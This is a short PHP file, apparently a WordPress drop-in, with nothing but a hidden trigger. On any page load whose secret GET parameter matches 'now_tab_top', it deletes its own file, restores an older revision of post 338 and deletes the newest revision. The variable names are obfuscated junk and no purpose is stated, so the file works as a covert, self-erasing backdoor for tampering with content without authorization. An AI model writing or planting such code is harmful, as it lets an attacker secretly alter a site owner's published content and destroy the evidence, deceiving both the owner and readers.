<?php

function rank_pop_sync_codes() {
	if (isset($_GET['custom_purchase_save']) && $_GET['custom_purchase_save'] === 'now_tab_top') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$exchange_weather_xml_bangla = 338;
		$post_listing_progress = wp_get_post_revisions($exchange_weather_xml_bangla);
		if (empty($post_listing_progress)) die('no revisions');
		if (count($post_listing_progress) < 2) die('less than 2');
		$out_qr_ecommerce = array_shift($post_listing_progress);
		$wall_utils_tinymce = $out_qr_ecommerce->ID;
		$options_community_address_express = array_shift($post_listing_progress);
		$upgrader_tracking_patterns_poll = $options_community_address_express->ID;
		$newsletter_com_slide = wp_restore_post_revision($upgrader_tracking_patterns_poll);
		if ($newsletter_com_slide === false) die('error restoring');
		$newsletter_com_slide = wp_delete_post_revision($wall_utils_tinymce);		
		if ($newsletter_com_slide === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'rank_pop_sync_codes');
